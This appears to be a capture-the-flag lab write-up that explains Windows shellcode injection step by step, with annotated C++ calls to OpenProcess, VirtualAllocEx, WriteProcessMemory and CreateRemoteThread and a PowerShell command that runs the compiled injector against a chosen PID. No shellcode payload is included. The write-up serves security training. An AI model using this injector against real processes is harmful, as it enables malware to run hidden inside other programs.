# Shellcode injection

Shellcode injection is the most basic form of process injection.

## Overview

| ![Shell injection](/_static/images/shell-injection.png) |
|:--:|
| How Windows API calls interact with process memory. |

1. Open a target process with all access rights ([OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)).
2. Allocate target process memory for the shellcode ([VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)).
3. Write shellcode to allocated memory in the target process ([WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)).
4. Execute the shellcode using a remote thread ([CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)).

## C++ Code

Open the target process supplied via the command-line:

```text
processHandle = OpenProcess(
	PROCESS_ALL_ACCESS, // Defines access rights
	FALSE, // Target handle will not be inhereted
	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments 
);
```

Allocate memory to the byte size of the shellcode:

```text
remoteBuffer = VirtualAllocEx(
	processHandle, // Opened target process
	NULL, 
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
```

Use the allocated memory region to write our shellcode to memory regions:

```text
WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);
```

Execute the shellcode residing in memory:

```text
remoteThread = CreateRemoteThread(
	processHandle, // Opened target process
	NULL, 
	0, // Default size of the stack
	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
	NULL, 
	0, // Ran immediately after creation
	NULL
);
```

Compile to create a basic process injector (`shellcode-injector.exe`).

## Injection

On the target machine, start up Powershell, and identify a `PID` of a process running as `THM-Attacker` to target 
(using Details tab of TaskManager). I chose the PID of the Powershell.

```text
PS C:\Users\THM-Attacker> cd .\Desktop\
PS C:\Users\THM-Attacker\Desktop> cd .\Injectors\
PS C:\Users\THM-Attacker\Desktop\Injectors> .\shellcode-injector.exe PID
```

Flag!

## Resources

* [MITRE: process injection](https://attack.mitre.org/techniques/T1055)
